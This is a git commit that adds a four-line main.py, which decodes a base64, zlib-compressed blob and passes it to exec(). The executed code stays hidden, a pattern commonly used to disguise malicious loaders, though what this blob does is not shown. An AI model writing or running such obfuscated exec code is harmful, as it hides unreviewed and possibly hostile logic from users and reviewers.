6f4c78ca30afa74f44e87760939666c8eafbf1c2
Aniket Dinda <38289183+deadlysnowman3308@users.noreply.github.com>
2021-06-12 21:52:33 +0530

    Add files via upload

---
+++ main.py
@@ -0,0 +1,4 @@
+import zlib, base64
+exec(zlib.decompress(base64.b64decode('eJxVzs2OwiAUBeA9T2G6ERYDraFM1XThM+jOTCZwubRMFbRQf95+4jQuZnW+5OQkx58vccyLnxQD8bNHvE6YciKmfZN3mN+10QmVJEM7gxslLUK0SPYtNbToc76kjRCjvoMNvPO51zBwiGfxgg/dzZ+0eMYpTwa/fXBRVKpsnJMWDNSNKuu6ksrJcq30Sq2dlNXq04IG+W/FX6cLxv6Ssi0+EOhA98diF/yAh+KL8fkZXU7ZfTRLxsgvcUVQVQ==')))
+
+
